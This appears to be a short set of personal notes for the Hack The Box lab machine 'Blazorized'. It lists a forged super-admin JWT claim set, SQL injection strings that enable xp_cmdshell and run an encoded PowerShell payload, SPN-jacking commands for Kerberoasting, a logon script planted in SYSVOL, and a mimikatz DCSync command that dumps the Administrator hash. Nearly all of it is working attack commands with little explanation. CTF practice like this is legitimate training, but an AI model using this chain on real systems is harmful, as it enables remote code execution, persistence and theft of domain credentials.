# Blazorized

JWT:

{

  "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "superadmin@blazorized.htb",
  
  "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Super_Admin",
  
  "iss": "http://api.blazorized.htb",
  
  "aud": "http://admin.blazorized.htb",
  
  "exp": 1740000000
  
}



Inject:

www'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -

www'; exec master..xp_cmdshell 'powershell#3base64';-- -



SPN Jacking

https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking

https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/

Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='xx/xx'}

Get-DomainSPNTicket -SPN xx/xx



Login bat:

'powershell #3 base64 payload'| Out-File -FilePath C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23\shell.bat -Encoding ASCII



Set ScriptPath:

Set-ADUser -Identity SSA_6010 -ScriptPath 'A32FF3AEAA23\shell.bat'


Get NTLM Hash:

lsadump::dcsync /domain:blazorized.htb /user:Administrator
